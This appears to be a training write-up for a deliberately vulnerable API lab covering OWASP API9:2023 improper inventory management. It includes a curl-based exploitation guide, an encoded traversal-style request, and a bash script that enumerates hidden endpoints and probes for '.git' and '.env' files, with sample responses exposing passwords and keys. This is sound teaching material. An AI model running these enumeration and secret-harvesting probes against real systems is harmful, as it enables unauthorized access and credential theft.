API9:2023 Improper Inventory Management

MEDIUM SEVERITY

Description

APIs tend to expose more endpoints than traditional web applications. Proper documentation and inventory of all API endpoints and versions is essential. This vulnerability includes undocumented endpoints, deprecated versions, debug endpoints left in production, and shadow APIs.

Affected Files

  • app/routes/debug.py - Hidden debug endpoints
  • app/routes/admin.py - Hidden admin endpoints
  • app/routes/users.py - Undocumented user lookup
  • app/routes/orders.py - Hidden statistics endpoint
  • app/routes/auth.py - Undocumented token verification

Exploitation Guide

1. Discover All Routes

The debug endpoint exposes all registered routes:

# List all API routes
curl http://localhost:5000/api/debug/routes | jq

# Filter for interesting endpoints
curl -s http://localhost:5000/api/debug/routes | jq '.routes[] | select(.path | contains("admin") or contains("debug") or contains("hidden"))'

# This reveals undocumented endpoints like:
# /api/debug/.hidden
# /api/admin/hidden/users
# /api/admin/hidden/debug
# /api/users/by-api-key/
# /api/orders/statistics

2. Hidden Debug Endpoints

# Access hidden debug endpoint
curl http://localhost:5000/api/debug/.hidden

# Response reveals secrets:
# {
#   "message": "You found the hidden endpoint!",
#   "secrets": {
#     "admin_password": "admin123",
#     "api_key": "secret-api-key-12345",
#     "database": "sqlite:///vulnapi.db"
#   }
# }

# Path-encoded hidden endpoint
curl "http://localhost:5000/api/debug/..%2f..%2f"

3. Hidden Admin Endpoints

# Hidden user list (no auth required!)
curl http://localhost:5000/api/admin/hidden/users

# Hidden debug info
curl http://localhost:5000/api/admin/hidden/debug

# Response includes JWT secret and other sensitive data

4. Undocumented User Lookup

# Lookup user by API key
curl http://localhost:5000/api/users/by-api-key/admin-api-key-12345

# This endpoint isn't documented but exposes full user data
# Can enumerate API keys to find valid ones

5. Hidden Statistics Endpoint

# Order statistics (no auth required)
curl http://localhost:5000/api/orders/statistics

# Exposes business-sensitive data:
# - Total orders
# - Total revenue
# - Total profit
# - Status breakdown

6. Undocumented Token Verification

# Verify token endpoint
curl http://localhost:5000/api/auth/verify-token \
  -H "Authorization: Bearer $TOKEN"

# Returns decoded token payload - useful for reconnaissance

7. Endpoint Enumeration Script

Script to discover hidden endpoints:

#!/bin/bash
# Enumerate potential hidden endpoints

BASE="http://localhost:5000/api"
WORDLIST=(
  "admin" "debug" "test" "dev" "staging" "backup"
  "internal" "private" "secret" "hidden" "old"
  "v1" "v2" "v3" "beta" "alpha" "legacy"
  "config" "settings" "env" "info" "status"
  "health" "metrics" "stats" "logs" "audit"
  "swagger" "docs" "graphql" "graphiql"
  ".git" ".env" "robots.txt" "sitemap.xml"
)

for word in "${WORDLIST[@]}"; do
  response=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/$word")
  if [ "$response" != "404" ]; then
    echo "[+] Found: $BASE/$word (HTTP $response)"
  fi
done

# Check for common paths under each resource
for resource in users products orders admin debug files auth; do
  for word in hidden internal debug test backup export import; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/$resource/$word")
    if [ "$response" != "404" ]; then
      echo "[+] Found: $BASE/$resource/$word (HTTP $response)"
    fi
  done
done

8. Version Discovery

# Check for versioned endpoints
for v in v1 v2 v3 api-v1 api-v2; do
  curl -s -o /dev/null -w "%{http_code} - /$v/users\n" "http://localhost:5000/$v/users"
done

# Check API info endpoint
curl http://localhost:5000/api | jq

Hidden Endpoints in VulnAPI-101

Endpoint Description Risk
/api/debug/.hidden Exposes secrets Critical
/api/admin/hidden/users User dump (no auth) High
/api/admin/hidden/debug Config exposure Critical
/api/users/by-api-key/{key} User lookup by key Medium
/api/orders/statistics Business metrics Medium
/api/auth/verify-token Token introspection Low
/api/debug/routes Full API inventory High

Impact

  • Shadow APIs: Undocumented endpoints bypass security review
  • Data Exposure: Hidden endpoints may lack authentication
  • Attack Surface: More endpoints = more attack vectors
  • Compliance: Undocumented APIs violate security policies

Remediation

  1. Maintain complete API documentation (OpenAPI/Swagger)
  2. Remove all debug/test endpoints before production
  3. Use API gateway to control exposed endpoints
  4. Regular API endpoint audits
  5. Implement API versioning properly
  6. Monitor for unauthorized endpoint access
